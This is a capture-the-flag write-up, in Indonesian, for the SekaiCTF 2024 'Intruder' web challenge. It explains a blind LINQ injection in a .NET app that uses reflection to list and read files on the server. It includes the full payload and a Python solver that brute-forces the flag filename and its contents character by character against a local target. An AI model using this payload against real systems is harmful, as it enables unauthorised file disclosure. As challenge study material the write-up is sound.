# Intruder - Web - SekaiCTF 2024

Pada challenge kali ini terdapat kerentanan SQLinjection dengan memanfaatkan reflection pada `.NET`. Pada challenge ini aplikasi akan menggabungkan inputan pengguna ke dalam query `LINQ` tanpa ada sanitasi yang memadai. Hal ini memungkinkan kita untuk menjalankan kode seperti `.GetType().Assembly.DefinedTypes` yang merupakan code `C#` yang bukan bagian dari `SQL`.

dengan memanfaatkan kode `C#` ini memungkinkan kita untuk membaca file `flag` yang terdapat pada direktori `/`.

namun karena flag disimpan di direktori `/` dengan nama yang acak dengan format `/flag_'cat /proc/sys/kernel/random/uuid'.txt`, kita harus melakukan fuzzing nama file `flag` terlebih dahulu, sebelum melakukan fuzzing isi dari file `flag`.

## Fuzzing Filename

berikut merupakan payload untuk melakukan fuzzing nama file flag:
```clike
'Harry") AND "".GetType().Assembly.DefinedTypes.First(x => x.FullName == "System"+"."+"String").DeclaredMethods.Where(x => x.Name == "StartsWith").First().Invoke("".GetType().Assembly.DefinedTypes.First(x => x.FullName == "System.Array").DeclaredMethods.Where(x => x.Name == "GetValue").Skip(1).First().Invoke("".GetType().Assembly.DefinedTypes.First(x => x.FullName == "System.IO.Directory").DeclaredMethods.Where(x => x.Name == "GetFiles").Skip(1).First().Invoke(null, new object[] { "/", "flag*.txt" }), new object[] { 0 }), new object[] { "/'+payload+'" }).ToString()=="True" AND ("xx"="xx'
```

saya akan membagi payload diatas menjadi 3 bagian. 

### Paylaoad #1
```clike
"".GetType().Assembly.DefinedTypes.First(x => x.FullName == "System"+"."+"String").DeclaredMethods.Where(x => x.Name == "StartsWith").First()
```
bagian pertama untuk mengambil `System.String` dari assembly .NET, kemudian mencari metode yang disebut `StartsWith` pada `System.String`.

### Paylaoad #2
```clike
"".GetType().Assembly.DefinedTypes.First(x => x.FullName == "System.Array").DeclaredMethods.Where(x => x.Name == "GetValue").Skip(1).First()
```
payload bagian 2 mebambil`System.Array` dari assembly .NET lalu mencari `GetValue`. `Skip(1)` melewati metode pertama dan memilih metode kedua. Ini penting karena metode GetValue bisa memiliki overload, dan kita memilih metode tertentu.

### Paylaoad #3
```clike
"".GetType().Assembly.DefinedTypes.First(x => x.FullName == "System.IO.Directory").DeclaredMethods.Where(x => x.Name == "GetFiles").Skip(1).First().Invoke(null, new object[] { "/", "flag*.txt" }), new object[] { 0 }), new object[] { "/'+payload+'" }).ToString()=="True"
```
Ini mengakses tipe `System.IO.Directory` dan mencari metode `GetFiles`, yang digunakan untuk mencari file dalam direktori. `Invoke(null, new object[] { "/", "flag*.txt" })` memanggil metode GetFiles untuk mencari file dengan pola flag*.txt di direktori root (/).

Metode `StartsWith` digunakan untuk memverifikasi apakah nama file yang ditemukan dimulai dengan string yang diberikan `(yaitu /'+payload+')`.

dan untuk mendapatkan membaca isi dari `flag`, kurang lebih cara nya sama seperti mendapatkan filename, berikut merupakan kode solvernya

## Sovler Code
```python
import httpx
import asyncio
from urllib.parse import quote_plus

URL = 'http://localhost:8080'
PARAM = '/Books?searchString='

class BaseAPI:
    def __init__(self, url=URL):
        self.c = httpx.AsyncClient(base_url=url)

    async def visit(self, param=PARAM, c=''):
        sqli = quote_plus(
            'Harry") AND "".GetType().Assembly.DefinedTypes.First(x => x.FullName == "System"+"."+"String").DeclaredMethods.Where(x => x.Name == "StartsWith").First().Invoke("".GetType().Assembly.DefinedTypes.First(x => x.FullName == "System.Array").DeclaredMethods.Where(x => x.Name == "GetValue").Skip(1).First().Invoke("".GetType().Assembly.DefinedTypes.First(x => x.FullName == "System.IO.Directory").DeclaredMethods.Where(x => x.Name == "GetFiles").Skip(1).First().Invoke(null, new object[] { "/", "flag*.txt" }), new object[] { 0 }), new object[] { "/'+c+'" }).ToString()=="True" AND ("xx"="xx'
        )
        return await self.c.get(param + sqli)

    async def visit_flag(self, param=PARAM, filename='', c=''):
        sqli = quote_plus(
            'Harry") AND "".GetType().Assembly.DefinedTypes.First(x => x.FullName == "System"+"."+"String").DeclaredMethods.Where(x => x.Name == "StartsWith").First().Invoke("".GetType().Assembly.DefinedTypes.First(x => x.FullName == "System"+".IO."+"File").DeclaredMethods.Where(x => x.Name == "ReadAllText").First().Invoke(null, new object[] { "/'+filename+'" }), new object[] { "' + c + '" }).ToString()=="True" AND ("xx"="xx'
        )
        return await self.c.get(param + sqli)

class API(BaseAPI):
    pass

async def worker(api):
    filename = ''
    flag = ''
    fuzz = 'flag_-01234567890abcdef.txt'
    fuzz_flag = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}'
    
    while not filename.endswith('.txt'):
        for c in fuzz:
            res = await api.visit(c=filename+c)
            if 'No books found.' in res.text:
                continue
            else:
                filename += c
                print(filename)
    
    while not flag.endswith('}'):
        for c in fuzz_flag:
            res = await api.visit_flag(filename=filename, c=flag+c)
            if 'No books found.' in res.text:
                continue
            else:
                flag += c
                print(flag)

async def main():
    api = API()
    await worker(api)

if __name__ == '__main__':
    asyncio.run(main())
```

